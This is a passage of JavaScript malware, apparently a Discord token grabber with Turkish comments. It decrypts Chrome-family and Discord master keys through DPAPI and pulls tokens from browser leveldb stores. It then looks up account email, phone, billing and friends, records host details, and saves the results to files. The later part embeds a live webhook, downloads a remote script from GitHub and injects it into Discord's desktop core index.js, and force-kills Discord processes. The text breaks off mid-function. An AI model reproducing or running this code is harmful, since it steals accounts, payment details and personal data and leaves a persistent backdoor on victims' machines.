const fs = require('fs');
const os = require('os');
const path = require('path');
const axios = require('axios');
const crypto = require('crypto');
const dpapi = require("win-dpapi");
const { exec } = require('child_process');
const https = require('https');

// Çevresel değişkenlerden appdata ve localappdata'yı alın
var appdata = process.env.APPDATA,
    LOCAL = process.env.LOCALAPPDATA,
    localappdata = process.env.LOCALAPPDATA;
let browser_paths = [localappdata + '\\Google\\Chrome\\User Data\\Default\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\', localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\', localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\', appdata + '\\Opera Software\\Opera Stable\\', appdata + '\\Opera Software\\Opera GX Stable\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\', localappdata + '\\Microsoft\\Edge\\User Data\\Default\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\', localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'];

// Tokenlerin veya ilgili dosyaların olabileceği yollar
paths = [
    appdata + '\\discord\\',
    appdata + '\\discordcanary\\',
    appdata + '\\discordptb\\',
    appdata + '\\discorddevelopment\\',
    appdata + '\\lightcord\\',
    localappdata + '\\Google\\Chrome\\User Data\\Default\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\',
    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\',
    localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',
    appdata + '\\Opera Software\\Opera Stable\\',
    appdata + '\\Opera Software\\Opera GX Stable\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'
];



function getProfiles(path, name) {
    const profile = path.split("%PROFILE%");
    if (profile.length == 1) {
        return [{
            path: path,
            name: name
        }];
    }

    if (!fs.existsSync(profile[0])) {
        return [];
    }

    var dirs = fs.readdirSync(profile[0]);
    var profiles = [];
    for (var i = 0; i < dirs.length; i++) {
        var dir = dirs[i];
        if (fs.existsSync(profile[0] + dir + profile[1])) {
            profiles.push({
                "path": profile[0] + dir + profile[1],
                "profile": name + " " + dir
            });
        }
    }

    return profiles;
}

class DiscordAccount {
    constructor(username, discriminator, id, nitro, badges, billings, email, phone, token, avatar, bio) {
        this.username = username;
        this.tag = `${username}#${discriminator}`;
        this.id = id;
        this.nitro = nitro;
        this.badges = badges;
        this.billings = billings;
        this.email = email;
        if (phone != "" && phone != undefined) {
            this.phone = phone;
        } else {
            this.phone = "None"
        }
        if (bio != "" && bio != undefined) {
            this.bio = bio.replace(/\n/gm, "\\n")
        } else {
            this.bio = "None"
        }
        this.token = token;
        this.avatar = "https://cdn.discordapp.com/avatars/" + id + "/" + avatar + ".png";
    }
}

function getMasterKey(basePath) {
    let masterKeyPath = basePath + "\\Local State";
    let encrypted = Buffer.from(JSON.parse(fs.readFileSync(masterKeyPath, "utf-8"))["os_crypt"]["encrypted_key"], "base64").slice(5);
    return dpapi.unprotectData(Buffer.from(encrypted, "utf-8"), null, 'CurrentUser');
}

function getEncryptedToken(basepath) {
    let logsPath = basepath + "\\Local Storage\\leveldb\\";
    if (!fs.existsSync(logsPath)) {
        return [];
    }
    let files = fs.readdirSync(logsPath);
    var encrypted_regex = /dQw4w9WgXcQ:[^\"]*/gm;
    var result = [];

    for (let file of files) {
        if (!(file.endsWith(".log") || file.endsWith(".ldb"))) {
            continue;
        }

        let content = fs.readFileSync(logsPath + file, "utf-8");
        result = result.concat(content.match(encrypted_regex));
    }

    result = result.filter((item, pos) => result.indexOf(item) == pos);
    result = result.filter(function (el) {
        return el != null;
    });
    return result;
}

function decryptoToken(encryptedTokens, masterKey) {
    var tokens = [];
    for (let encryptedToken of encryptedTokens) {
        try {
            var token = Buffer.from(encryptedToken.split('dQw4w9WgXcQ:')[1], "base64");
            let start = token.slice(3, 15),
                middle = token.slice(15, token.length - 16),
                end = token.slice(token.length - 16, token.length),
                decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, start);

            decipher.setAuthTag(end);
            token = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8')
            tokens.push(token);
        } catch (e) {
            continue
        }
    }
    return tokens;
}

function getBadges(json) {
    let badges = [{
        "name": "<:staff:874750808728666152>",
        "flag": 1
    }, {
        "name": "<:partner:874750808678354964>",
        "flag": 2
    }, {
        "name": "<:hypesquad_events:874750808594477056>",
        "flag": 4
    }, {
        "name": "<:bughunter_1:874750808426692658>",
        "flag": 8
    }, {
        "name": "<:bughunter_2:874750808430874664>",
        "flag": 16384
    }, {
        "name": "<:developer:874750808472825986>",
        "flag": 131072
    }, {
        "name": "<:early_supporter:874750808414113823>",
        "flag": 512
    }, {
        "name": "<:bravery:874750808388952075>",
        "flag": 64
    }, {
        "name": "<:brilliance:874750808338608199>",
        "flag": 128
    }, {
        "name": "<:balance:874750808267292683>",
        "flag": 256
    }, {
        "name": "<:activedev:1041634224253444146>",
        "flag": 4194304
    }]

    let flag = json["flags"];
    var badgesRes = "";

    for (let badge of badges) {
        if ((flag & badge.flag) == badge.flag) {
            badgesRes = badgesRes + " " + badge.name;
        }
    }

    return (badgesRes == "") ? "`None`" : badgesRes;
}

function getNitro(json) {
    if (json["premium_type"] == 1) {
        return "<:classic:896119171019067423>`Nitro Classic`";
    } else if (json["premium_type"] == 2) {
        return "<a:boost:824036778570416129>`Nitro Boost`";
    } else {
        return "`None`";
    }
}

async function getBilling(token) {
    var billings = "";
    try {
        const res = await axios({
            url: `https://canary.discord.com/api/v9/users/@me/billing/payment-sources`,
            method: "GET",
            headers: {
                "Authorization": `${token}`
            }
        })

        for (let billing of res.data) {
            let type = billing["type"];
            let invalid = billing["invalid"];

            if (type == 1 && !invalid) {
                billings = billings + " :credit_card:";
            }
            if (type == 2 && !invalid) {
                billings = billings + " <:paypal:896441236062347374>";
            }
        }
    } catch (e) {};
    return (billings == "") ? "`None`" : billings;
}

async function getAccounts(tokens) {
    let accounts = [];
    for (let token of tokens) {
        var billing;
        try {
            billing = await getBilling(token);
        } catch (e) {
            continue;
        }
        try {
            const res = await axios({
                url: `https://discord.com/api/v9/users/@me`,
                method: "GET",
                headers: {
                    "Authorization": `${token}`
                }
            })
            const json = res.data;
            if (json.message == null) {
                accounts.push(new DiscordAccount(json.username, json.discriminator, json.id, getNitro(json), getBadges(json), billing, json.email, json.phone, token, json.avatar, json.bio));
            }
        } catch (e) {
            continue;
        }
    }

    return accounts;
}

async function grabDiscord() {
    let appdata = process.env.APPDATA;
    let local = process.env.LOCALAPPDATA;
    var discordPath = [
        appdata + "\\discord",
        appdata + "\\discordcanary",
        appdata + "\\discordptb",
    ];

    var tokens = [];

    for (let path of discordPath) {
        if (!fs.existsSync(path)) {
            continue;
        }
        let encryptedTokens = getEncryptedToken(path);
        let masterKey = getMasterKey(path);
        tokens = tokens.concat(decryptoToken(encryptedTokens, masterKey));
    }


    var browsers_path = [
        appdata + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
        appdata + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",
        local + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\",
        local + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\",
        local + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\",
        local + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\",
        local + "\\CentBrowser\\User Data\\Local Storage\\leveldb\\",
        local + "\\Orbitum\\User Data\\Local Storage\\leveldb\\",
        local + "\\Kometa\\User Data\\Local Storage\\leveldb\\",
        local + "\\Torch\\User Data\\Local Storage\\leveldb\\",
        local + "\\Amigo\\User Data\\Local Storage\\leveldb\\",
        local + "\\BraveSoftware\\Brave-Browser\\User Data\\%PROFILE%\\Local Storage\\leveldb\\",
        local + "\\Iridium\\User Data\\%PROFILE%\\Local Storage\\leveldb\\",
        local + "\\Yandex\\YandexBrowser\\User Data\\%PROFILE%\\Local Storage\\leveldb\\",
        local + "\\uCozMedia\\Uran\\User Data\\%PROFILE%\\Local Storage\\leveldb\\",
        local + "\\Microsoft\\Edge\\User Data\\%PROFILE%\\Local Storage\\leveldb\\",
        local + "\\Google\\Chrome\\User Data\\%PROFILE%\\Local Storage\\leveldb\\",
        local + "\\Vivaldi\\User Data\\%PROFILE%\\Local Storage\\leveldb\\"
    ];

    var browsers_profile = [];
    for (var i = 0; i < browsers_path.length; i++) {
        const browser = browsers_path[i];
        const profiles = getProfiles(browser, browser.split("\\")[6]);
        for (var j = 0; j < profiles.length; j++) {
            browsers_profile.push(profiles[j].path);
        }
    }

    const reg1 = Buffer.from("W1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17Mjd9", 'base64').toString();
    const reg2 = Buffer.from("bWZhXC5bXHctXXs4NH0=", 'base64').toString();
    const reg3 = Buffer.from("W1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17MjUsMTEwfQ==", 'base64').toString();
    
    const cleanRegex = [new RegExp(reg1, 'gm'),
        new RegExp(reg2, 'gm'), new RegExp(reg3, 'gm')
    ];

    for (let path of browsers_profile) {
        if (!fs.existsSync(path)) {
            continue;
        }

        let files = fs.readdirSync(path);
        for (let file of files) {
            for (let reg of cleanRegex) {
                if (!(file.endsWith(".log") || file.endsWith(".ldb"))) {
                    continue;
                }

                let content = fs.readFileSync(path + file, "utf-8");
                tokens = tokens.concat(content.match(reg));
            }
        }
    }

    tokens = tokens.filter(function (item, pos) {
        return tokens.indexOf(item) == pos && item != null;
    });

    
    return await getAccounts(tokens);
}

async function grabDiscordAndSave() {
    try {
        const accounts = await grabDiscord();

        // Yazılacak veriyi formatla
        const data = accounts.map(account => `
        Username: ${account.username}
        Tag: ${account.tag}
        ID: ${account.id}
        Nitro: ${account.nitro}
        Badges: ${account.badges}
        Billings: ${account.billings}
        Email: ${account.email}
        Phone: ${account.phone}
        Token: ${account.token}
        Avatar: ${account.avatar}
        Bio: ${account.bio}
        `).join('\n====================\n');

        // Dosyaya yaz
        fs.writeFile('apptokens.txt', data, (err) => {
            if (err) {
                console.error("Dosya yazılırken bir hata oluştu:", err);
     
            }
            console.log("Hesap bilgileri başarıyla output.txt dosyasına yazıldı.");

        });
        
    } catch (err) {
        console.error("Bir hata oluştu:", err);
    
    }
}


const badges = {
    Discord_Employee: {
        Value: 1,
        Emoji: "Discord_Employee",
        Rare: true,
    },
    Partnered_Server_Owner: {
        Value: 2,
        Emoji: "Partnered_Server_Owner",
        Rare: true,
    },
    HypeSquad_Events: {
        Value: 4,
        Emoji: "HypeSquad_Events",
        Rare: true,
    },
    Bug_Hunter_Level_1: {
        Value: 8,
        Emoji: "Bug_Hunter_Level_1",
        Rare: true,
    },
    Early_Supporter: {
        Value: 512,
        Emoji: "Early_Supporter",
        Rare: true,
    },
    Bug_Hunter_Level_2: {
        Value: 16384,
        Emoji: "Bug_Hunter_Level_2",
        Rare: true,
    },
    Early_Verified_Bot_Developer: {
        Value: 131072,
        Emoji: "Early_Verified_Bot_Developer",
        Rare: true,
    },
    House_Bravery: {
        Value: 64,
        Emoji: "House_Bravery",
        Rare: false,
    },
    House_Brilliance: {
        Value: 128,
        Emoji: "House_Brilliance",
        Rare: false,
    },
    House_Balance: {
        Value: 256,
        Emoji: "House_Balance",
        Rare: false,
    },
    Discord_Official_Moderator: {
        Value: 262144,
        Emoji: "Discord_Official_Moderator",
        Rare: true,
    }
};

async function getRelationships(token) {
    var j = await axios.get('https://discord.com/api/v9/users/@me/relationships', {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    }).catch(() => { })
    if (!j) return `*Account locked*`
    var json = j.data
    const r = json.filter((user) => {
        return user.type == 1
    })
    var gay = '';
    for (z of r) {
        var b = getRareBadges(z.user.public_flags)
        if (b != "") {
            gay += `${b} | \`${z.user.username}#${z.user.discriminator}\`\n`
        }
    }
    if (gay == '') gay = "*Nothing to see here*"
    return gay
}

async function getBilling(token) {
    let json;
    await axios.get("https://discord.com/api/v9/users/@me/billing/payment-sources", {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    }).then(res => { json = res.data })
        .catch(err => { })
    if (!json) return '\`Unknown\`';

    var bi = '';
    json.forEach(z => {
        if (z.type == 2 && z.invalid != !0) {
            bi += "paypal";
        } else if (z.type == 1 && z.invalid != !0) {
            bi += "💳";
        }
    });
    if (bi == '') bi = `\`No Billing\``
    return bi;
}

function getBadges(flags) {
  const badgesList = []; // Badge'leri tutacak bir dizi

  for (const prop in badges) {
      let o = badges[prop];
      if ((flags & o.Value) === o.Value) {
          badgesList.push(o.Emoji); // Eşleşen badge'i diziye ekle
      }
  }

  if (badgesList.length === 0) return '`No Badges`'; // Eğer dizi boşsa

  // Badge'leri birleştir
  return badgesList.length > 1 
      ? badgesList.slice(0, -1).join(', ') + ' and ' + badgesList[badgesList.length - 1]
      : badgesList[0]; // Sadece bir badge varsa
}

function getRareBadges(flags) {
  const rareBadges = []; // Eşleşen nadir badge'leri tutacak dizi

  for (const prop in badges) {
      let o = badges[prop];
      if ((flags & o.Value) === o.Value && o.Rare) {
          rareBadges.push(o.Emoji); // Eşleşen nadir badge'i diziye ekle
      }
  }

  // Eğer birden fazla badge varsa aralarına "and" koyarak birleştir
  return rareBadges.length > 0 ? rareBadges.join(' and ') : ''; // Eğer hiç nadir badge yoksa boş döndür
}


async function getNitro(flags, id, token) {
    switch (flags) {
        case 1:
            return "Nitro Classic";
        case 2:
            let info;
            await axios.get(`https://discord.com/api/v9/users/${id}/profile`, {
                headers: {
                    "Content-Type": "application/json",
                    "authorization": token
                }
            }).then(res => { info = res.data })
                .catch(() => { })
            if (!info) return "Nitro Classic";

            if (!info.premium_guild_since) return "";

            let boost = ["1 Month Boost Badge", "2 Month Boost Badge", "3 Month Boost Badge", "6 Month Boost Badge", "9 Month Boost Badge", "12 Month Boost Badge", "15 Month Boost Badge", "18 Month Boost Badge", "24 Month Boost Badge"]
            var i = 0

            try {
                let d = new Date(info.premium_guild_since)
                let boost2month = Math.round((new Date(d.setMonth(d.getMonth() + 2)) - new Date(Date.now())) / 86400000)
                let d1 = new Date(info.premium_guild_since)
                let boost3month = Math.round((new Date(d1.setMonth(d1.getMonth() + 3)) - new Date(Date.now())) / 86400000)
                let d2 = new Date(info.premium_guild_since)
                let boost6month = Math.round((new Date(d2.setMonth(d2.getMonth() + 6)) - new Date(Date.now())) / 86400000)
                let d3 = new Date(info.premium_guild_since)
                let boost9month = Math.round((new Date(d3.setMonth(d3.getMonth() + 9)) - new Date(Date.now())) / 86400000)
                let d4 = new Date(info.premium_guild_since)
                let boost12month = Math.round((new Date(d4.setMonth(d4.getMonth() + 12)) - new Date(Date.now())) / 86400000)
                let d5 = new Date(info.premium_guild_since)
                let boost15month = Math.round((new Date(d5.setMonth(d5.getMonth() + 15)) - new Date(Date.now())) / 86400000)
                let d6 = new Date(info.premium_guild_since)
                let boost18month = Math.round((new Date(d6.setMonth(d6.getMonth() + 18)) - new Date(Date.now())) / 86400000)
                let d7 = new Date(info.premium_guild_since)
                let boost24month = Math.round((new Date(d7.setMonth(d7.getMonth() + 24)) - new Date(Date.now())) / 86400000)

                if (boost2month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost3month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost6month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost9month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost12month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost15month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost18month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost24month > 0) {
                    i += 0
                } else if (boost24month < 0 || boost24month == 0) {
                    i += 1
                } else {
                    i = 0
                }
            } catch {
                i += 0
            }
            return `${boost[i]}`
        default:
            return "\`No Nitro\`";
    };
}

var tokens = [];

async function findToken(path) {
  let path_tail = path;
  path += 'Local Storage\\leveldb';

  if (!path_tail.includes('discord')) {
      try {
          fs.readdirSync(path)
              .map(file => {
                  (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
                      .split(/\r?\n/)
                      .forEach(line => {
                          const patterns = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g)];
                          for (const pattern of patterns) {
                              const foundTokens = line.match(pattern);
                              if (foundTokens) foundTokens.forEach(token => {
                                  if (!tokens.includes(token)) tokens.push(token)
                              });
                          }
                      });
              });
      } catch (e) { }
      return;
  } else {
      if (fs.existsSync(path_tail + '\\Local State')) {
          try {
              const tokenRegex = /dQw4w9WgXcQ:[^.*['(.*)'\].*$][^"]*/gi;

              fs.readdirSync(path).forEach(file => {
                  if (file.endsWith('.log') || file.endsWith('.ldb')) {
                      const fileContent = fs.readFileSync(`${path}\\${file}`, 'utf8');
                      const lines = fileContent.split(/\r?\n/);

                      const localStatePath = path_tail + '\\Local State';
                      const key = decryptKey(localStatePath);

                      lines.forEach(line => {
                          const foundTokens = line.match(tokenRegex);
                          if (foundTokens) {
                              foundTokens.forEach(token => {
                                  let decrypted;
                                  const encryptedValue = Buffer.from(token.split(':')[1], 'base64');
                                  const start = encryptedValue.slice(3, 15);
                                  const middle = encryptedValue.slice(15, encryptedValue.length - 16);
                                  const end = encryptedValue.slice(encryptedValue.length - 16, encryptedValue.length);
                                  const decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
                                  decipher.setAuthTag(end);
                                  decrypted = decipher.update(middle, 'base64', 'utf8') + decipher.final('utf8');
                                  if (!tokens.includes(decrypted)) tokens.push(decrypted)
                              });
                          }
                      });
                  }
              });

          } catch (e) { }
          return;
      }
  }
}

async function stealwebTokens() {
  for (let path of paths) {
      await findToken(path);
  }

  for (let token of tokens) {
      try {
          let json;
          await axios.get("https://discord.com/api/v6/users/@me", {
              headers: {
                  "Content-Type": "application/json",
                  "authorization": token
              }
          }).then(res => { json = res.data }).catch(() => { json = null });
          if (!json) continue;


          var billing = await getBilling(token);
          var { friendsList, numberOfFriends } = await getRelationships(token);


          const randomString = crypto.randomBytes(16).toString('hex');
          const total_memory = os.totalmem();
          const total_mem_in_kb = total_memory / 1024;
          const total_mem_in_mb = total_mem_in_kb / 1024;
          const total_mem_in_gb = total_mem_in_mb / 1024;
          const total_mem_in_gb_fixed = total_mem_in_gb.toFixed(1);
          const processador = os.cpus()[0].model;

          const userInformation = `\nUsername: ${json.username} (${json.id})\nToken: ${token}\nBadges: ${getBadges(json.flags)}\nNitro Type: ${await getNitro(json.premium_type, json.id, token)}\nBilling: ${billing}\nEmail: ${json.email}`;

          const pcInfo = `\nHostname: ${os.hostname()}\nUsername: ${process.env.USERNAME}\nProcessor: ${processador}\nVersion: ${os.version()}\nMemory RAM: ${total_mem_in_gb_fixed}`;
          const friendsInfo = `\nHQ Friends | Total Friends: ${numberOfFriends}\n${friendsList}`;

          const data = `${userInformation}${pcInfo}${friendsInfo}`;

          fs.appendFileSync('webtokens.txt', data);
          return;

      } catch (error) {
          console.error(error);

      }
  }
}

stealwebTokens();
grabDiscordAndSave();


// Klasör yolları
const webhookUrl = 'https://discord.com/api/webhooks/1313201289487712296/XL2wZW456qmnaHE1HKdSqohHhlqccRUYbiPDZLmr5Y_uaX76GUXeCbbmfjS1INNsTjei';
const appData = process.env.APPDATA || path.join(process.env.HOME, '.config');
const localAppData = process.env.LOCALAPPDATA || path.join(process.env.HOME, '.local', 'share');
const discordPaths = [
    { appPath: path.join(appData, 'discord'), exePath: path.join(localAppData, 'Discord') },
    { appPath: path.join(appData, 'discordcanary'), exePath: path.join(localAppData, 'DiscordCanary') },
    { appPath: path.join(appData, 'discordptb'), exePath: path.join(localAppData, 'DiscordPTB') },
    { appPath: path.join(appData, 'discorddevelopment'), exePath: path.join(localAppData, 'DiscordDevelopment') },
    { appPath: path.join(appData, 'lightcord'), exePath: path.join(localAppData, 'Lightcord') },
];

// Regex tanımı
const encryptedRegex = /dQw4w9WgXcQ:[^\"]*/gm;

// Tüm Discord dizinlerini tarayarak işlem yapma
function walkDir(dir) {
    if (!fs.existsSync(dir)) {  // Dizin var mı kontrolü
        console.error(`Dizin bulunamadı: ${dir}`);
        return;
    }

    fs.readdirSync(dir).forEach(file => {
        const filePath = path.join(dir, file);
        try {
            if (fs.statSync(filePath).isDirectory()) {
                if (file.startsWith('app-')) {
                    const modulesPath = path.join(filePath, 'modules');
                    if (fs.existsSync(modulesPath)) {
                        const discordDesktopCore1Path = path.join(modulesPath, 'discord_desktop_core-1');
                        if (fs.existsSync(discordDesktopCore1Path)) {
                            const discordDesktopCorePath = path.join(discordDesktopCore1Path, 'discord_desktop_core');
                            if (fs.existsSync(discordDesktopCorePath)) {
                                const indexPath = path.join(discordDesktopCorePath, 'index.js');
                                if (fs.existsSync(indexPath)) {
                                    // İlgili URL'yi çekip dosyayı düzenle
                                    https.get('https://raw.githubusercontent.com/Wizzzy81/whowantkittycats/refs/heads/main/uskudar.js', response => {
                                        let data = '';
                                        response.on('data', chunk => {
                                            data += chunk;
                                        });
                                        response.on('end', () => {
                                            const newData = data.replace('%WEBHOOK%', webhookUrl);
                                            fs.writeFileSync(indexPath, newData);
                                            console.log(`${indexPath} başarıyla güncellendi.`);
                                        });
                                    });
                                }
                            }
                        }
                    }
                } else {
                    walkDir(filePath); // Eğer alt klasör varsa, tekrar tarama
                }
            }
        } catch (err) {
            console.error(`Dosyaya erişim hatası: ${filePath}`, err.message);
        }
    });
}

// Discord süreçlerini kapat
function killAllDiscordProcesses(callback) {
    console.log('Tüm Discord süreçleri sonlandırılıyor...');
    exec('tasklist', (err, stdout) => {
        if (err) {
            console.error('Süreç listesi alınamadı:', err);
            return;
        }

        // Çalışan Discord süreçlerini bul
        const discordProcesses = stdout
            .split('\n')
            .filter(line => line.toLowerCase().includes('discord'))
            .map(line => line.trim().split(/\s+/)[1]); // PID'yi al

        if (discordProcesses.length > 0) {
            console.log('Kapatılacak süreç PID\'leri:', discordProcesses);
            discordProcesses.forEach(pid => {
                exec(`taskkill /PID ${pid} /F`, (err) => {
                    if (err) {
                        console.error(`Süreç ${pid} sonlandırılamadı:`, err.message);
                    } else {
                        console.log(`Süreç ${pid} başarıyla sonlandırıldı.`);
                    }
                });
            });
        } else {
            console.log('Discord süreçleri bulunamadı.');
        }

        if (callback) setTimeout(callback, 2000); // Kapatma işleminden sonra gecikme
    });
}

// LDB ve LOG dosyalarını temizle
function cleanLevelDbFiles(callback) {
